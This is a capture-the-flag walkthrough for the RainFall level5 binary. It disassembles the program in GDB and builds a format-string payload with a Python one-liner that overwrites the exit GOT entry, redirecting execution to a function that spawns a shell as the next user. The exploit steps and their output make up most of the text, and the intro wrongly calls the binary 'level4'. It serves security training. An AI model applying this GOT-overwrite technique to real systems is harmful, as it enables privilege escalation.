# Walkthrough

After examining the contents of the home directory, I came across a binary file called "level4". Upon executing this binary, I noticed that it takes user input and outputs it. To further analyze the binary, i used the `objdump` command to extract all functions of this program. we can see that the program have the `o` and `n` functions.

```sh
level5@RainFall:~$ objdump -t ./level5  | grep .text
080483f0 l    d  .text 00000000              .text
08048420 l     F .text 00000000              __do_global_dtors_aux
08048480 l     F .text 00000000              frame_dummy
080485a0 l     F .text 00000000              __do_global_ctors_aux
08048590 g     F .text 00000002              __libc_csu_fini
08048592 g     F .text 00000000              .hidden __i686.get_pc_thunk.bx
080484c2 g     F .text 00000042              n
08048520 g     F .text 00000061              __libc_csu_init
080483f0 g     F .text 00000000              _start
080484a4 g     F .text 0000001e              o
08048504 g     F .text 0000000d              main

```

 So i used the GDB debugger  to extract more details. In the "main" function of the binary, there is a call to the "n" function.

```s
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   ebp
   0x08048505 <+1>:     mov    ebp,esp
   0x08048507 <+3>:     and    esp,0xfffffff0
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>: leave  
   0x08048510 <+12>: ret   
```

The `n` function reads user input using `fgets` and saves it in a buffer. It then uses `printf` to display the contents of the buffer, and exits without calling the "o" function.

```s
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>: push   ebp
   0x080484c3 <+1>: mov    ebp,esp
   0x080484c5 <+3>: sub    esp,0x218
   0x080484cb <+9>: mov    eax,ds:0x8049848
   0x080484d0 <+14>: mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>: mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>: lea    eax,[ebp-0x208]
   0x080484e2 <+32>: mov    DWORD PTR [esp],eax
   0x080484e5 <+35>: call   0x80483a0 <fgets@plt>
   0x080484ea <+40>: lea    eax,[ebp-0x208]
   0x080484f0 <+46>: mov    DWORD PTR [esp],eax
   0x080484f3 <+49>: call   0x8048380 <printf@plt>
   0x080484f8 <+54>: mov    DWORD PTR [esp],0x1
   0x080484ff <+61>: call   0x80483d0 <exit@plt>

```

Upon disassembling the "o" function, it appears to start a new shell process using the "system" function and then exits. To execute the "o" function, we need to find a way to call it within the current process.

```s
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>: push   ebp
   0x080484a5 <+1>: mov    ebp,esp
   0x080484a7 <+3>: sub    esp,0x18
   0x080484aa <+6>: mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>: call   0x80483b0 <system@plt>
   0x080484b6 <+18>: mov    DWORD PTR [esp],0x1
   0x080484bd <+25>: call   0x8048390 <_exit@plt>
```

To redirect the program's execution to another function, we can use a technique called `function hooking`. This involves overwriting the address of the original function in the Global Offset Table (GOT) with the address of the new function that we want to call. In this case, we can overwrite the address of the exit function in the GOT with the address of the o function. This way, when the n function calls the exit function, it will actually jump to the address of the o function instead. This allows us to execute the o function and perform any actions we want before the program exits.

In the following example, we can observe the address that requires modification to match the address of the `o` function.

```s
(gdb) r
Starting program: /home/user/level5/level5 
AAAA
AAAA
=> 0x80484ff <n+61>: call   0x80483d0 <exit@plt>

Breakpoint 1, 0x080484ff in n ()
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>: jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>: push   0x28
   0x080483db <+11>: jmp    0x8048370
End of assembler dump.
(gdb) x/wx 0x8049838
0x8049838 <exit@got.plt>: 0x080483d6
```

Similar to the previous level, we will exploit the format string vulnerability using a Python script to alter the value of the address `0x8049838` to `0x080484a4`.


First, we need to determine the locations of the address using the %x specifier specifier.

```sh
level5@RainFall:~$ ./level5 
AAAA %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
```

After computing the required padding to modify the value to match the address of the o function (0x080484a4), we will replace the value of the address 0x8049838 using n specifier. This will involve substituting the fourth `x` specifier with an `n` specifier and appending the calculated padding to the last `x` specifier.

```sh
level5@RainFall:~$ python2 -c 'print("\x08\x04\x98\x38"[::-1] + " " + "%x " * 2 + "%134513809x " + "%n")' > /tmp/flag

----------------------------------------------------------------------------------------------

(gdb) r < /tmp/flag
=> 0x80484ff <n+61>:	call   0x80483d0 <exit@plt>

Breakpoint 1, 0x080484ff in n ()
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:	push   0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) x/wx 0x8049838
0x8049838 <exit@got.plt>:	0x080484a4 // address of "o" function
```

By doing so, we can now execute the binary file using the updated buffer that was read from the output redirected by the script mentioned earlier:
```sh
level5@RainFall:~$ cat /tmp/flag - | ./level5
8 200 b7fd1ac0 (after 134513801 space)b7ff37d0 
whoami
level6
cd ..
cd level6
ls -la
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
```